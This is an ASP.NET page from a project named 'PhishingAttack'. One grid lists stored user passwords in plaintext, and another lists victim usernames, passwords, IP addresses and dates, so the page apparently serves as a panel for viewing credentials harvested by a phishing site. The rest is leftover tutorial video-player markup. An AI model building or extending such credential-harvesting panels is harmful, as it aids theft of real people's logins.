<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="popup.aspx.cs" Inherits="PhishingAttack.popup" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
    
        <asp:Label ID="Label1" runat="server" Text=""></asp:Label>
    
        <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
            DataKeyNames="UserName" DataSourceID="SqlDataSource1">
            <Columns>
                <asp:BoundField DataField="UserId" HeaderText="UserId" InsertVisible="False" 
                    ReadOnly="True" SortExpression="UserId" />
                <asp:BoundField DataField="UserName" HeaderText="UserName" ReadOnly="True" 
                    SortExpression="UserName" />
                <asp:BoundField DataField="Password" HeaderText="Password" 
                    SortExpression="Password" />
                <asp:BoundField DataField="Email" HeaderText="Email" SortExpression="Email" />
                <asp:BoundField DataField="Age" HeaderText="Age" SortExpression="Age" />
                <asp:BoundField DataField="Country" HeaderText="Country" 
                    SortExpression="Country" />
                <asp:TemplateField HeaderText="#">
               
                    <ItemTemplate>
                        <%# Container.DataItemIndex + 1 %>
                    </ItemTemplate>
               
                </asp:TemplateField>
            </Columns>
        </asp:GridView>
        <asp:FileUpload ID="logoImageUpload" runat="server" />
        <br />
        <asp:Button ID="Button1" runat="server" Height="34px" Text="Button" 
            Width="68px" onclick="Button1_Click1" />
            <br />
        <asp:LinkButton ID="LinkButton1" runat="server" onclick="LinkButton1_Click">LinkButton</asp:LinkButton>
        <br />
        <asp:GridView ID="GridView2" runat="server" CellPadding="4" ForeColor="#333333" 
            GridLines="None" AutoGenerateColumns="False">
            <AlternatingRowStyle BackColor="White" ForeColor="#284775" />
            <Columns>
                <asp:BoundField DataField="UserName" HeaderText="User Name"/>
                <asp:BoundField DataField="Category" HeaderText="Category"/>
                <asp:BoundField DataField="VictimUserName" HeaderText="Victim User Name"/>
                <asp:BoundField DataField="Password" HeaderText="Password"/>
                <asp:BoundField DataField="IPAddress" HeaderText="IPAddress"/>
                <asp:BoundField DataField="Date" HeaderText="Date"/>
            </Columns>
            <EditRowStyle BackColor="#999999" />
            <FooterStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
            <HeaderStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
            <PagerStyle BackColor="#284775" ForeColor="White" HorizontalAlign="Center" />
            <RowStyle BackColor="#F7F6F3" ForeColor="#333333" />
            <SelectedRowStyle BackColor="#E2DED6" Font-Bold="True" ForeColor="#333333" />
            <SortedAscendingCellStyle BackColor="#E9E7E2" />
            <SortedAscendingHeaderStyle BackColor="#506C8C" />
            <SortedDescendingCellStyle BackColor="#FFFDF8" />
            <SortedDescendingHeaderStyle BackColor="#6F8DAE" />
        </asp:GridView>


        <asp:SqlDataSource ID="SqlDataSource1" runat="server" 
            ConnectionString="<%$ ConnectionStrings:IdHackDBConnectionString %>" 
            SelectCommand="SELECT * FROM [UserDetails]"></asp:SqlDataSource>
    
        
    
    </div>
    <asp:Button ID="Button2" runat="server" onclick="Button2_Click" Text="Button" />
    <asp:Button ID="Button3" runat="server" onclick="Button3_Click" Text="Button" />
    <br />
    <br />
    <br />
    <br />
    <br />

    <asp:Button ID="Button5" runat="server" Text="Button" />
    </form>



        <div style="text-align:center"> 
  <button onclick="playPause()">Play/Pause</button> 
  <Button onclick="makeBig()">Big</button>
  <Button onclick="makeSmall()">Small</button>
  <Button onclick="makeNormal()">Normal</button>
  <br><br>
  <video id="video1" width="420">
    <source src="1. Registration Form in Asp.Net C@ with Sql Server Database _ Live Example _ Online_HD.mp4" type="video/mp4">
    <source src="1. Registration Form in Asp.Net C@ with Sql Server Database _ Live Example _ Online_HD.mp4" type="video/ogg">
    Your browser does not support HTML video.
  </video>
</div> 

<script>
    var myVideo = document.getElementById("video1");

    function playPause() {
        if (myVideo.paused)
            myVideo.play();
        else
            myVideo.pause();
    }

    function makeBig() {
        myVideo.width = 1200;
    }

    function makeSmall() {
        myVideo.width = 320;
    }

    function makeNormal() {
        myVideo.width = 420;
    } 
</script> 

<p>Video courtesy of <a href="https://www.bigbuckbunny.org/" target="_blank">Big Buck Bunny</a>.</p>
</body>
</html>
